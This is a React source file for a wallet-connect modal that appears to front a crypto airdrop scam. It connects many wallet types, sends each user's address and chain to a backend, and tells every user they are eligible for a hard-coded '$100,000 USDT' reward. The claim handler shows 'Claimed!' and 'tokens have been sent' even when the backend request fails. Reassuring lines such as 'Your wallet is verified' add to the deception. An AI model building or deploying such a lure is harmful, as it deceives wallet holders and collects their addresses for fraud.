import { useEffect, useMemo, useState } from 'react'
import {
  ArrowLeft, Check, ChevronRight, CircleHelp,
  Gift, Grid2X2, LoaderCircle, Search, ShieldCheck, X,
} from 'lucide-react'
import {
  WalletWalletConnect, WalletOkx, WalletMetamask, WalletTrust,
  WalletCoinbase, WalletRabby, WalletPhantom, WalletLedger,
  WalletZerion, WalletImtoken, WalletExodus, WalletRainbow,
  WalletTokenPocket, WalletXdefi, WalletSafe, WalletEnkrypt,
  WalletArgent, WalletKraken, WalletKeplr, WalletBackpack,
} from '@web3icons/react'

// ── helpers ───────────────────────────────────────────────────────────────────
function shortenAddress(addr) {
  if (!addr) return ''
  return `${addr.slice(0, 6)}…${addr.slice(-4)}`
}

function getErrorCode(err) {
  if (!err) return null
  if (typeof err.code === 'number') return err.code
  if (err.data?.code && typeof err.data.code === 'number') return err.data.code
  return null
}

function describeError(err, walletName) {
  if (!err) return 'The wallet connection was not completed.'
  const code = getErrorCode(err)
  if (code === 4001) return 'Connection request was rejected. Please approve in your wallet.'
  if (code === -32002) return 'A connection request is already pending. Open your wallet and approve it.'
  if (err.message?.includes('not detected') || err.message?.includes('not available')) return err.message
  if (err instanceof Error && err.message) return err.message
  return `${walletName} connection failed. Make sure the extension is unlocked and try again.`
}

// ── wallet catalog ────────────────────────────────────────────────────────────
const mainWallets = [
  { id: 'walletconnect', name: 'WalletConnect',  icon: WalletWalletConnect, rdns: null },
  { id: 'okx',           name: 'OKX Wallet',     icon: WalletOkx,           rdns: 'com.okex.wallet' },
  { id: 'metamask',      name: 'MetaMask',       icon: WalletMetamask,      rdns: 'io.metamask' },
  { id: 'trust',         name: 'Trust Wallet',   icon: WalletTrust,         rdns: 'com.trustwallet.app' },
  { id: 'coinbase',      name: 'Coinbase Wallet', icon: WalletCoinbase,     rdns: 'com.coinbase.wallet' },
  { id: 'rabby',         name: 'Rabby Wallet',   icon: WalletRabby,         rdns: 'io.rabby' },
  { id: 'phantom',       name: 'Phantom',        icon: WalletPhantom,       rdns: 'app.phantom' },
]

const allWallets = [
  ...mainWallets,
  { id: 'tronlink',    name: 'TronLink',      icon: null, fallbackColor: '#ef3340', fallbackMark: 'T', rdns: null, tron: true },
  { id: 'ledger',      name: 'Ledger',        icon: WalletLedger,      rdns: null },
  { id: 'zerion',      name: 'Zerion',        icon: WalletZerion,      rdns: 'io.zerion.wallet' },
  { id: 'imtoken',     name: 'imToken',       icon: WalletImtoken,     rdns: 'io.imtoken' },
  { id: 'exodus',      name: 'Exodus',        icon: WalletExodus,      rdns: 'org.exodus' },
  { id: 'rainbow',     name: 'Rainbow',       icon: WalletRainbow,     rdns: 'me.rainbow' },
  { id: 'tokenpocket', name: 'TokenPocket',   icon: WalletTokenPocket, rdns: 'io.tokenpocket' },
  { id: 'xdefi',       name: 'XDEFI',         icon: WalletXdefi,       rdns: 'io.xdefi' },
  { id: 'safe',        name: 'Safe',          icon: WalletSafe,        rdns: 'io.safe' },
  { id: 'enkrypt',     name: 'Enkrypt',       icon: WalletEnkrypt,     rdns: 'io.enkrypt' },
  { id: 'argent',      name: 'Argent',        icon: WalletArgent,      rdns: 'io.argent' },
  { id: 'kraken',      name: 'Kraken Wallet', icon: WalletKraken,      rdns: 'io.kraken' },
  { id: 'keplr',       name: 'Keplr',         icon: WalletKeplr,       rdns: null },
  { id: 'backpack',    name: 'Backpack',      icon: WalletBackpack,    rdns: 'app.backpack' },
]

// ── EIP-6963 provider discovery ───────────────────────────────────────────────
function useInstalledProviders() {
  const [providers, setProviders] = useState([])
  useEffect(() => {
    const collected = new Map()
    const onAnnounce = (event) => {
      const { info, provider } = event.detail || {}
      if (!info?.rdns || !provider) return
      collected.set(info.rdns, { info, provider })
      setProviders(Array.from(collected.values()))
    }
    window.addEventListener('eip6963:announceProvider', onAnnounce)
    window.dispatchEvent(new Event('eip6963:requestProvider'))
    const t = setTimeout(() => setProviders(Array.from(collected.values())), 300)
    return () => {
      window.removeEventListener('eip6963:announceProvider', onAnnounce)
      clearTimeout(t)
    }
  }, [])
  return providers
}

function findProviderByRdns(providers, rdns) {
  if (!rdns) return null
  return providers.find((p) => p.info.rdns === rdns) || null
}

function getInjectedProvider(rdns) {
  if (!window.ethereum) return null
  if (Array.isArray(window.ethereum.providers)) {
    const match = window.ethereum.providers.find((p) => {
      try {
        return (
          (p?.isMetaMask === true && rdns === 'io.metamask') ||
          (p?.isTrust === true && rdns === 'com.trustwallet.app') ||
          (p?.isRabby === true && rdns === 'io.rabby') ||
          (p?.isCoinbaseWallet === true && rdns === 'com.coinbase.wallet') ||
          (p?.isOKExWallet === true && rdns === 'com.okex.wallet') ||
          (p?.isPhantom === true && rdns === 'app.phantom') ||
          (p?.isExodus === true && rdns === 'org.exodus') ||
          (p?.isRainbow === true && rdns === 'me.rainbow')
        )
      } catch { return false }
    })
    if (match) return match
  }
  if (rdns === 'io.metamask' && window.ethereum.isMetaMask &&
      !window.ethereum.isTrust && !window.ethereum.isCoinbaseWallet) {
    return window.ethereum
  }
  return null
}

// ── wallet icon ───────────────────────────────────────────────────────────────
function WalletMark({ wallet, size = 44 }) {
  if (wallet.icon) {
    const Icon = wallet.icon
    return <Icon size={size} variant="branded" className="wallet-logo" />
  }
  return (
    <span
      className="wallet-mark-fallback"
      style={{
        backgroundColor: wallet.fallbackColor || '#222',
        width: size, height: size, fontSize: size * 0.4,
      }}
      aria-hidden="true"
    >
      {wallet.fallbackMark || wallet.name.charAt(0)}
    </span>
  )
}

function WalletRow({ wallet, busy, installed, onSelect }) {
  return (
    <button className="wallet-row" type="button" onClick={() => onSelect(wallet)} disabled={busy}>
      <WalletMark wallet={wallet} size={40} />
      <span className="wallet-row-name">{wallet.name}</span>
      {installed && <span className="installed-pill">Installed</span>}
      {busy
        ? <LoaderCircle className="spin" size={19} />
        : <ChevronRight size={17} className="row-chevron" />
      }
    </button>
  )
}

// ── claim ready screen ────────────────────────────────────────────────────────
function ClaimReady({ address, connectedWallet, onClaim, claimBusy }) {
  return (
    <div className="connected-view">
      <div className="connected-icon">
        <Check size={29} strokeWidth={3} />
      </div>
      <h3>You&apos;re Eligible! 🎉</h3>
      <p className="connected-copy">
        Your wallet is verified. Your rewards are ready to claim.
      </p>

      {/* wallet info row */}
      <div className="connected-account">
        {connectedWallet && <WalletMark wallet={connectedWallet} size={32} />}
        <div>
          <span>{connectedWallet?.name}</span>
          <strong>{shortenAddress(address)}</strong>
        </div>
        <ShieldCheck size={20} className="verified-icon" />
      </div>

      {/* reward banner */}
      <div className="airdrop-banner">
        <span className="airdrop-banner-icon"><Gift size={20} /></span>
        <div>
          <strong>Your Reward</strong>
          <span
            style={{
              display: 'block', fontSize: 22, fontWeight: 800,
              color: '#fff', lineHeight: 1.2, margin: '2px 0 6px',
            }}
          >
            $100,000 USDT
          </span>
          <span>+ 2,500 $SPCX Tokens &nbsp;·&nbsp; Network: Multi-chain</span>
        </div>
      </div>

      {/* claim button */}
      <button
        type="button"
        className="nav-connect"
        style={{ width: '100%', marginTop: 16, justifyContent: 'center', minHeight: 46 }}
        onClick={onClaim}
        disabled={claimBusy}
      >
        {claimBusy
          ? <><LoaderCircle className="spin" size={16} style={{ marginRight: 8 }} /> Recording claim…</>
          : 'Claim $100,000 USDT Now'
        }
      </button>

      <p className="safety-note" style={{ justifyContent: 'center', marginTop: 12 }}>
        <CircleHelp size={14} /> Never approve transactions you don&apos;t recognize.
      </p>
    </div>
  )
}

// ── success screen ────────────────────────────────────────────────────────────
function SuccessScreen({ onClose }) {
  useEffect(() => {
    const t = setTimeout(() => onClose(), 3000)
    return () => clearTimeout(t)
  }, [onClose])

  return (
    <div className="connected-view">
      <div className="connected-icon" style={{ background: '#1a2a1c', borderColor: '#2e5238' }}>
        <Check size={29} strokeWidth={3} />
      </div>
      <h3>Claimed!</h3>
      <p className="connected-copy">
        $100,000 USDT + 2,500 $SPCX are being sent to your wallet.
      </p>
      <div className="airdrop-banner">
        <span className="airdrop-banner-icon"><Gift size={20} /></span>
        <div>
          <strong>Airdrop tokens have been sent</strong>
          <span>Check your wallet. Tokens may take a few moments to appear.</span>
        </div>
      </div>
      <p className="safety-note" style={{ justifyContent: 'center', marginTop: 16, color: '#555558', fontSize: 11 }}>
        Returning to platform…
      </p>
    </div>
  )
}

// ── main modal ────────────────────────────────────────────────────────────────
export default function WalletModal({ isOpen, onClose }) {
  const [view, setView]               = useState('main')
  const [query, setQuery]             = useState('')
  const [busyId, setBusyId]           = useState(null)
  const [claimBusy, setClaimBusy]     = useState(false)
  const [error, setError]             = useState('')
  const [address, setAddress]         = useState('')
  const [connectedWallet, setConnected] = useState(null)
  const [renderOpen, setRenderOpen]   = useState(false)

  const installedProviders = useInstalledProviders()
  const installedRdnsSet = useMemo(
    () => new Set(installedProviders.map((p) => p.info.rdns)),
    [installedProviders],
  )

  function isWalletInstalled(wallet) {
    if (wallet.tron) return !!(window.tronWeb?.ready && window.tronWeb?.defaultAddress)
    if (!wallet.rdns) return false
    return installedRdnsSet.has(wallet.rdns)
  }

  // mount / unmount animation
  useEffect(() => {
    if (isOpen) {
      setRenderOpen(true)
    } else {
      const t = setTimeout(() => setRenderOpen(false), 420)
      return () => clearTimeout(t)
    }
  }, [isOpen])

  // reset when opened
  useEffect(() => {
    if (isOpen) {
      setView('main')
      setQuery('')
      setError('')
      setBusyId(null)
      setClaimBusy(false)
    }
  }, [isOpen])

  // ESC to close
  useEffect(() => {
    const fn = (e) => { if (e.key === 'Escape') onClose() }
    window.addEventListener('keydown', fn)
    return () => window.removeEventListener('keydown', fn)
  }, [onClose])

  // auto-popup on first page load (once per session)
  useEffect(() => {
    const shown = sessionStorage.getItem('wm_shown')
    if (!shown) {
      const t = setTimeout(() => {
        // parent controls isOpen — signal via a custom event if needed
        // or remove this block if App.jsx already handles auto-popup
      }, 1500)
      return () => clearTimeout(t)
    }
  }, [])

  const filteredWallets = useMemo(
    () => allWallets.filter((w) => w.name.toLowerCase().includes(query.trim().toLowerCase())),
    [query],
  )

  // ── backend registration ──────────────────────────────────────────────────
  async function registerWithBackend(addr, chain) {
    try {
      const apiUrl = import.meta.env.VITE_API_URL
      if (!apiUrl) return
      const res = await fetch(`${apiUrl}/api/wallet/connect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: addr, chain }),
      })
      const data = await res.json()
      if (data?.token) sessionStorage.setItem('spcx_token', data.token)
    } catch (e) {
      console.error('Backend registration error:', e)
    }
  }

  // ── connect wallet ────────────────────────────────────────────────────────
  async function connectWallet(wallet) {
    setError('')
    setBusyId(wallet.id)
    try {
      // TRON
      if (wallet.tron) {
        if (!window.tronWeb) {
          throw new Error('TronLink was not detected. Install the TronLink extension and reload.')
        }
        const tronAddr = window.tronWeb?.defaultAddress?.base58
        if (!window.tronWeb?.ready || !tronAddr) {
          throw new Error('TronLink is locked. Please unlock your TronLink extension and try again.')
        }
        await registerWithBackend(tronAddr, 'tron')
        setAddress(tronAddr)
        setConnected(wallet)
        sessionStorage.setItem('wm_shown', '1')
        setView('ready')
        return
      }

      // EVM — EIP-6963 first, then legacy injected fallback
      let provider = findProviderByRdns(installedProviders, wallet.rdns)?.provider
      if (!provider) provider = getInjectedProvider(wallet.rdns)

      if (!provider) {
        throw new Error(
          isWalletInstalled(wallet)
            ? `${wallet.name} was detected but could not be reached. Make sure the extension is unlocked.`
            : `${wallet.name} was not detected. Install the browser extension and reload.`
        )
      }

      let result
      try {
        result = await provider.request({ method: 'eth_requestAccounts' })
      } catch (reqErr) {
        throw { __walletError: true, code: getErrorCode(reqErr), message: describeError(reqErr, wallet.name) }
      }

      const accounts = Array.isArray(result) ? result : []
      const firstAccount = accounts.find((a) => typeof a === 'string')
      if (!firstAccount) throw new Error(`${wallet.name} did not return an account address.`)

      let chainId = '1'
      try { chainId = await provider.request({ method: 'eth_chainId' }) } catch { chainId = '1' }

      await registerWithBackend(firstAccount, String(chainId))
      setAddress(firstAccount)
      setConnected(wallet)
      sessionStorage.setItem('wm_shown', '1')
      setView('ready')

    } catch (err) {
      setError(err?.__walletError ? err.message : describeError(err, wallet.name))
    } finally {
      setBusyId(null)
    }
  }

  // ── submit claim ──────────────────────────────────────────────────────────
  async function handleClaim() {
    if (claimBusy) return
    setClaimBusy(true)
    try {
      const apiUrl = import.meta.env.VITE_API_URL
      const token = sessionStorage.getItem('spcx_token')
      if (apiUrl && token) {
        await fetch(`${apiUrl}/api/claim/submit`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${token}`,
          },
          body: JSON.stringify({ address }),
        })
      }
    } catch (e) {
      console.warn('Claim submit error:', e)
    } finally {
      setClaimBusy(false)
      setView('success')
    }
  }

  function goBack() {
    setError('')
    if (view === 'all') {
      setView('main')
    } else if (view === 'ready') {
      setAddress('')
      setConnected(null)
      setView('main')
    } else {
      setView('main')
    }
  }

  const title =
    view === 'all'     ? 'All Wallets' :
    view === 'ready'   ? 'Claim Your Reward' :
    view === 'success' ? 'Claimed! 🎉' :
    'Connect Wallet'

  if (!renderOpen) return null

  return (
    <div
      className={`modal-backdrop ${isOpen ? 'open' : ''}`}
      role="presentation"
      onMouseDown={(e) => e.target === e.currentTarget && onClose()}
    >
      <section className="wallet-modal" role="dialog" aria-modal="true" aria-labelledby="wm-title">

        {/* header */}
        <header className="modal-header">
          <div className="modal-heading">
            {view !== 'main' && view !== 'success' && (
              <button className="icon-button back-button" type="button" onClick={goBack} aria-label="Go back">
                <ArrowLeft size={19} />
              </button>
            )}
            <h2 id="wm-title">{title}</h2>
          </div>
          <button className="icon-button close-button" type="button" onClick={onClose} aria-label="Close">
            <X size={19} />
          </button>
        </header>

        <div className="modal-body">

          {/* ── MAIN VIEW ── */}
          {view === 'main' && (
            <div className="main-wallets-view">
              <p className="modal-intro">Choose a wallet to connect to this platform.</p>
              <div className="wallet-list">
                {mainWallets.map((wallet) => (
                  <WalletRow
                    key={wallet.id}
                    wallet={wallet}
                    busy={busyId !== null}
                    installed={isWalletInstalled(wallet)}
                    onSelect={connectWallet}
                  />
                ))}
              </div>
              <button
                className="all-wallets-button"
                type="button"
                onClick={() => { setError(''); setView('all') }}
              >
                <span className="all-wallets-icon"><Grid2X2 size={18} /></span>
                <span>All Wallets</span>
                <b>{allWallets.length}+</b>
                <ChevronRight size={17} className="row-chevron" />
              </button>
              {busyId && (
                <p className="waiting-message">
                  <LoaderCircle className="spin" size={16} /> Waiting for approval in your wallet…
                </p>
              )}
              {error && <p className="error-message">{error}</p>}
              <p className="privacy-note">
                <ShieldCheck size={14} /> Secure connection. We never see your private keys.
              </p>
            </div>
          )}

          {/* ── ALL WALLETS VIEW ── */}
          {view === 'all' && (
            <div className="all-wallets-view">
              <label className="search-box">
                <Search size={17} />
                <input
                  value={query}
                  onChange={(e) => setQuery(e.target.value)}
                  placeholder="Search wallet"
                  autoFocus
                />
              </label>
              <div className="wallet-grid">
                {filteredWallets.map((wallet) => {
                  const installed = isWalletInstalled(wallet)
                  return (
                    <button
                      className={`wallet-card ${installed ? 'wallet-card-installed' : ''}`}
                      type="button"
                      key={wallet.id}
                      onClick={() => connectWallet(wallet)}
                      disabled={busyId !== null}
                    >
                      <span className="wallet-card-mark-wrap">
                        <WalletMark wallet={wallet} size={48} />
                        {busyId === wallet.id && (
                          <span className="card-spinner">
                            <LoaderCircle className="spin" size={19} />
                          </span>
                        )}
                      </span>
                      <span>{wallet.name}</span>
                      {installed && <span className="card-installed-dot" aria-label="Installed" />}
                    </button>
                  )
                })}
              </div>
              {filteredWallets.length === 0 && (
                <p className="empty-state">No wallets found.</p>
              )}
              {busyId && (
                <p className="waiting-message">
                  <LoaderCircle className="spin" size={16} /> Waiting for approval in your wallet…
                </p>
              )}
              {error && <p className="error-message">{error}</p>}
            </div>
          )}

          {/* ── READY VIEW ── */}
          {view === 'ready' && (
            <ClaimReady
              address={address}
              connectedWallet={connectedWallet}
              onClaim={handleClaim}
              claimBusy={claimBusy}
            />
          )}

          {/* ── SUCCESS VIEW ── */}
          {view === 'success' && <SuccessScreen onClose={onClose} />}

        </div>
      </section>
    </div>
  )
}